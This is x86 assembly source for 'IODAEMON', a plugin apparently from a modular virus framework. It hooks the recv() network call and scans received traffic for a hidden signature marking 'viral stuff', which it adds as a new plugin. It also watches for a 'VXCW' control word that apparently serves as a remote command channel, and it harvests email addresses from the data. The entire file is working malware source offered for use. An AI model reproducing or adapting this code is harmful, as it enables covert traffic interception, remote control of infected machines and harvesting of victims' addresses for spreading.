   ; IODAEMON
   ; ~~~~~~~~
   ; - recv() data processor
   ;   þ find emails
   ;   þ find PGNs

   include                 INCLUDE\consts.inc
   include                 iohooker.inc
   include                 rxio.inc
   include                 addpgn.inc

   include                 plugin.inc
                           PLUGIN_START    IODAEMON, CODE32, PERMUTABLE

   handleevent:            hookevent EV_IOHOOKER_ON_RECV, onrecv
                           stc
                           retn

   ; send/recv stack frame:
   ;                       mov     eax, [edx+0]    ; SOCKET
   ;                       mov     eax, [edx+8]    ; len
   ;                       mov     eax, [edx+4]    ; buf
   ;                       mov     eax, [edx+12]   ; flags

   ; input: EDX=recv() stack frame ptr
   ;        ECX=# of bytes received

   onrecv:                 pusha

                           mov     esi, [edx+4]    ; buf
                           lea     edi, [esi+ecx]  ; edi=lastbyte
                           cld

                           call    process_pgn
                           call    process_controlword
                           call    process_email

                           popa
                           stc
                           retn

   ; ---------------------------------------------------------------------------

   ; input: ESI=buf, ECX=len
   ; action:
   ;   scan for special 8-byte signature
   ;   (each byte: hi 4-bits are random; combined lower 4-bits == 'SHIT')
   ;   that signature created as universal identificator of viral stuff
   ;   passing through recv()/send(),
   ;   as a replacement of both RSA- && UUE- signature scanning.
   ; example signatures:
   ;   5cT(4iED EcdH4IeD US4X$i5$ ES4(Di%T
   ;   5s$($)%$ e3d8di%T USDhD)54 U348dye4
   ;   esTXD9U4 eSdX4)UD %#4XdyE$ eS$(DI5$
   ; generator:
   ;   for (int i=7; i>=0; i--)
   ;     printf("%c", (rndR(0x20,0x80-16)&0xF0) | (( 'TIHS' >> (i*4)) & 15));

   ; see DEMOPGN.TXT for examples

   process_pgn:            pusha

   __cycle:                cmp     ecx, 64         ; eax = min possible pgn len
                           jl      __exit

                           lodsb
                           and     al, 15
                           shl     edx, 4
                           or      dl, al

                           mov     eax, edx
                           neg     eax
                           cmp     eax, -'SHIT'
                           jne     __skip

                           event   EV_ADDPGN_ADD_PGN_BUF  ; i: ESI/ECX

   __skip:                 dec     ecx
                           jmp     __cycle

   __exit:                 popa
                           retn

   ; ---------------------------------------------------------------------------

   process_controlword:    pusha

   ; VXCWevXXXX....

   __cycle:                cmp     ecx, 10
                           jb      __exit

                           mov     eax, [esi]

                           neg     eax
                           cmp     eax, -'WCXV'
                           jne     __skip

                           event   EV_IODAEMON_GOT_VXCW

   __skip:                 inc     esi
                           dec     ecx
                           jmp     __cycle

   __exit:                 popa
                           retn

   ; ---------------------------------------------------------------------------

   checkrange              macro   a, b, lbl
                           local   __skip
                           cmp     al, a
                           jb      __skip
                           cmp     al, b
                           jbe     lbl
   __skip:                 endm

   EMAIL_MAX_LEN           equ     32
   EMAIL_MIN_LEN           equ     10

   ; input: ESI=buf, EDI=lastbyte

   process_email:          pusha
                           sub     esp, EMAIL_MAX_LEN

                           jmp     __restart

   __cycle:                lodsb

                           cmp     al, '@'
                           je      __at
                           cmp     al, '.'
                           je      __point

                           checkrange 'a','z',__goodchar
                           checkrange 'A','Z',__goodchar
                           checkrange '0','9',__goodchar

   __add:                  call    __tryadd

   __restart:              xor     edx, edx        ; flags
                           xor     ebx, ebx        ; index == email length

   __cont:                 cmp     esi, edi
                           jb      __cycle

                           call    __tryadd

                           add     esp, EMAIL_MAX_LEN
                           popa
                           retn

   __at:                   inc     dh
                           jmp     __goodchar

   __point:                inc     dl
                           jmp     __goodchar

   __goodchar:             mov     [esp+ebx], al
                           inc     ebx

                           cmp     ebx, EMAIL_MAX_LEN-1
                           jae     __restart

                           jmp     __cont


   __tryadd:               cmp     ebx, EMAIL_MIN_LEN
                           jb      __skipadd
                           cmp     dh, 1           ; @   #=1
                           jne     __skipadd
                           dec     dl
                           cmp     dl, 5           ; .   #=1,2,3,4,5
                           jae     __skipadd

                           lea     edx, [esp+4]
                           xchg    ecx, ebx
                           mov     byte ptr [edx+ecx], 0
                           event   EV_IODAEMON_GOT_EMAIL

   __skipadd:              retn

   ; ---------------------------------------------------------------------------

                           PLUGIN_END
